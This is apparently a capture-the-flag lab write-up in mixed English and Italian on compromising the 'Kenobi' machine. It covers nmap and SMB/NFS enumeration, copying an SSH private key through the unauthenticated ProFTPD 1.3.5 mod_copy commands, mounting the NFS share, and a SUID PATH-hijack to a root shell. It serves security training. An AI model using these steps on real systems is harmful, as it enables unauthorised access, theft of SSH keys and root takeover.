
>myIP = 10.10.106.111
>victimIP = 10.10.105.197

## Port Scan

`nmap -oN scan_results.txt  -sV -O 10.10.105.197`

| Port    | State | Service       | Version                                          |
| ------- | ----- | ------------- | ------------------------------------------------ |
| 21/tcp  | open  | ftp           | ProFTPD 1.3.5                                   |
| 22/tcp  | open  | ssh           | OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) |
| 80/tcp  | open  | http          | Apache httpd 2.4.18 ((Ubuntu))                  |
| 111/tcp | open  | rpcbind       | 2-4 (RPC #100000)                               |
| 139/tcp | open  | netbios-ssn   | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)     |
| 445/tcp | open  | netbios-ssn   | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)     |
| 2049/tcp| open  | nfs_acl       | 2-3 (RPC #100227)                               |

MAC Address: 02:B4:02:52:A4:B5 (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
Network Distance: 1 hop
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NOTE:
- port 21 --> ProFTPD è un popolare server FTP (File Transfer Protocol) open-source utilizzato per consentire il trasferimento di file su una rete, inclusa Internet.
- port 22 --> SSH, acronimo di "Secure Shell," è un protocollo di rete progettato per consentire la comunicazione sicura e crittografata tra due sistemi, in genere un client e un server.
- port 111 --> `rpcbind`, noto anche come `portmap`, è un servizio utilizzato nei sistemi operativi Unix-like per mappare chiamate di procedura remota (RPC) a porte di rete. Le RPC sono un meccanismo utilizzato per la comunicazione tra processi su reti distribuite, consentendo a programmi su un computer di chiamare procedure (funzioni o metodi) su un altro computer in modo trasparente.
- 139 e 445 --> Samba è una suite di software open source che offre la capacità di condividere file e risorse su reti miste di computer, inclusi sistemi Windows, Linux e UNIX. Questa suite consente ai computer non-Windows di partecipare in modo nativo a una rete Windows e di accedere e condividere file e stampanti come se fossero sistemi Windows.


> We note Samba on 139 and 445 ports:

![[Pasted image 20230919092006.png]]

Try to enumerate these ports: 

==L'enumerazione delle condivisioni SMB è una tecnica utilizzata per ottenere informazioni sulle cartelle o i volumi condivisi su un server o un dispositivo di rete. Queste informazioni possono includere i nomi delle condivisioni, i permessi di accesso e altre informazioni pertinenti.==


`nmap -p 139 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.105.197`

```
Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.105.197\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.105.197\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.105.197\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```


`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.105.197`

```
Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.105.197\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.105.197\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.105.197\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

==Notiamo che c'è la directory "/anonymous".==

La directory "/anonymous" è una convenzione comune utilizzata in molti sistemi di file e server FTP (File Transfer Protocol) per indicare una directory a cui è possibile accedere in modalità "anonima" senza richiedere credenziali di accesso. Quando una directory è contrassegnata come "/anonymous", significa che gli utenti possono accedervi senza dover fornire un nome utente o una password.

Try to connect: `smbclient //10.10.105.197/anonymous`

![[Pasted image 20230919092830.png]]

Note that exist a file:

![[Pasted image 20230919093021.png]]

We can download it with: `smbget -R smb://10.10.105.197/anonymous`

![[Pasted image 20230919093115.png]]

Important note:

- Port 21 is the standard FTP port.
- ServerName  "ProFTPD Default Installation"
- There is a RSA key to connect to SSH

```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi

```

So, in port 21 there is a FTP and thus previous nmap scan we snow that is 1.3.5 version.

We can search exploit for this version: `searchsploit ProFTPD 1.3.5`

![[Pasted image 20230919093919.png]]

We will use `https://www.exploit-db.com/exploits/49908`

The mod_copy module implements **SITE CPFR** and **SITE CPTO** commands, which can be used to copy files/directories from one place to another on the server.

We see info that commands **SITE CPFR** and **SITE CPTO** might be used by unauthenticated clients. That lets us basically copy and paste files and directories within the server.

==We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.==

But we must have a path where we can view the files. We know that there is another open port: `|111/tcp|open|rpcbind|2-4 (RPC #100000)|`

This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve

We can run nmap script to enumerate it: `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.105.197`

![[Pasted image 20230919095948.png]]

This command shows directories that are available to client machines.
The `/var` directory is accessible from our attacking machine.

NOTE: we can do the same check with `showmount -e IP` -->   
elenca le condivisioni NFS (Network File System) esportate da un server NFS specifico, identificato dall'indirizzo IP specificato. NFS è un protocollo che consente di condividere file e directory su reti UNIX e UNIX-like.

## Gain access

First, we need to connect to FTP server on port 21: `nc 10.10.105.197 21`
Then, using CPFR and CPTO command we copy the ssh private key from `/home/kenobi/.ssh/id_rsa` to `/var/tmp`:

![[Pasted image 20230919103705.png]]

NOTE: Why `/var/tmp` ? Because you might not have permission to write in `/var` directory. Directories like `/tmp` or `/var/tmp` are usually the safest when it comes to accessing their content as the attacker. Usually their permissions are not restricted as much as other directories.

At this point we need to mount `/var/tmp` directory to our attacking machine. Like this:

(ON ATTACKING MACHINE)

```
# create a new folder on KALI
mkdir /mnt/kenobiNFS

# mount /var folder of victim to new folder
mount 10.10.105.197:/var /mnt/kenobiNFS
```

Now, in `/mnt/kenobiNFS` there are all files we need.
So, in `/mnt/kenobiNFS/tmp/` there is `id_rsa` that we previous copy with `CPFR` and `CPTO` commands.

We can now login with ssh: `ssh -i id_rsa kenobi@10.10.105.197`


## Privilege Escalation

We search for files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

```
find / -perm -u=s -type f 2>/dev/null
```

![[Pasted image 20230919104435.png]]

Using https://gtfobins.github.io/ we search for SUID exploits but we don't find anything.

But we note that there is `/usr/bin/menu` file which is not so ordinary. Try to run it:

![[Pasted image 20230919104833.png]]

Using `strings` we note this:

![[Pasted image 20230919105046.png]]

==Binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).==

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

Here’s what we’re gonna do:
1. We will create a file called `curl` and put `/bin/sh` in it just like that,
2. Give all the permissions to the `curl` file that we just created by `chmod a+rwx curl`or `chmod 777 curl`
3. Add the directory with our `curl` script to the PATH so that system would look for it when calling `curl` . Attention! The order is respected here so we will ==need to add path to our directory at the beginning==. Otherwise, when calling `curl` the system might find a proper version of curl on the way before even checking if there’s any binary like that in our directory
4. Call the script and enjoy the show!

![[1_B-brXOAkJWWKbqIl-Ad-gw.webp]]

![[Pasted image 20230919105537.png]]



``
